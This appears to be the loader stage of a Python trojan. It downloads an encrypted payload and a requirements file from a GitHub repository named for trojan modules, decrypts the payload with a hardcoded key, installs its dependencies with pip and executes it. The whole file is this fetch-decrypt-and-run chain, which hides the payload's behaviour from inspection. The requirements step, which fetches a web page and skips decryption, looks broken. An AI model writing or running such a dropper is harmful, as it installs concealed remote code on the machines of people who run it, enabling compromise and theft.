import requests as requests
import subprocess
import decryption

key = b'8Shjz6mNyel8p7qNCETNEqrxBodA2MZbOtsJ6un79EQ='
payload_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/payload.py.enc"
requirements_url = "https://github.com/stephanevdb/python-trojan-modules/blob/main/requirements.txt.enc"

if __name__ == '__main__':
    p = requests.get(payload_url, allow_redirects=True)
    open('payload/' + 'payload.py.enc', 'wb').write(p.content)
    r = requests.get(requirements_url, allow_redirects=True)
    open('payload/' + 'requirements.txt', 'wb').write(r.content)

    decryption.decrypt_file('payload/' + 'payload.py.enc', key)

    subprocess.run(["pip", "install", "-r", 'payload/' + "requirements.txt"])
    subprocess.run(["python", 'payload/' + "payload.py"])
